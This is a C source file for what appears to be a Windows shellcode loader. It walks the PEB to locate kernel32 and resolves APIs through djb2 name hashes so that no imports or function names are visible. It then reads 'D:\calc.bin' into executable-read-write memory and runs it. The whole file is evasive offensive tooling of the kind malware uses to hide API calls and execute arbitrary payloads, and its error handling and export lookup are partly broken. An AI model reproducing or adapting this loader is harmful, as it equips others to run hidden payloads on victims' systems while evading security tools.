#include "common.h"

/*
        0x8a90ce6c20b80cc9 CreateFileA
        0x8aa47fa8adb30bef GetFileSize
        0x674469f8e250ba50 ReadFile
        0x8a8fdea06d9210d6 CloseHandle
        0xe9cf8c2311763046 VirtualAlloc
        0x8af6c62f9bb115fd VirtualFree
        0x8ac525e46d705b83 MessageBoxA
*/



void myMain()
{

#ifdef _WIN64 
    PPEB pPeb = (PPEB)(__readgsqword(0x60));
#elif _WIN32 
    PPEB pPeb = (PPEB)(__readfsdword(0x30));
#endif
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLIST_ENTRY pListEntry = (PLIST_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - 0x10);

    pListEntry = pListEntry->Flink;
    pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - 0x10);
    pListEntry = pListEntry->Flink;
    pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - 0x10);

    HMODULE kHandle = (HMODULE)(pDte->DllBase);

    myCreateFileA fnCreateFileA = (myCreateFileA)myGetProcAddress(kHandle, 0x8a90ce6c20b80cc9);
    myGetFileSize fnGetFileSize = (myGetFileSize)myGetProcAddress(kHandle, 0x8aa47fa8adb30bef);
    myReadFile fnReadFile = (myReadFile)myGetProcAddress(kHandle, 0x674469f8e250ba50);
    myCloseHandle fnCloseHandle = (myCloseHandle)myGetProcAddress(kHandle, 0x8a8fdea06d9210d6);
    myVirtualAlloc fnVirtualAlloc = (myVirtualAlloc)myGetProcAddress(kHandle, 0xe9cf8c2311763046);
    myVirtualFree fnVirtualFree = (myVirtualFree)myGetProcAddress(kHandle, 0x8af6c62f9bb115fd);

    char filePath[] = { 'D', ':', '\\', 'c', 'a', 'l', 'c', '.', 'b', 'i', 'n', 0 };

    HANDLE hFile = fnCreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD fileSize = fnGetFileSize(hFile, NULL);
    void* execMem = fnVirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL) {
        fnCloseHandle(hFile);
    }
    DWORD bytesRead;
    if (!fnReadFile(hFile, execMem, fileSize, &bytesRead, NULL)) {
        fnCloseHandle(hFile);
        fnVirtualFree(execMem, 0, MEM_RELEASE);
    }
    fnCloseHandle(hFile);

    ((void(*)())execMem)();

    fnVirtualFree(execMem, 0, MEM_RELEASE);

}


PVOID myGetProcAddress(IN HMODULE hModule, DWORD64 dwApiNameHash) {
    PBYTE pBase = (PBYTE)hModule;
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == djb2(pFunctionName)) {
            return pFunctionAddress;
        }
    }

    return NULL;
}

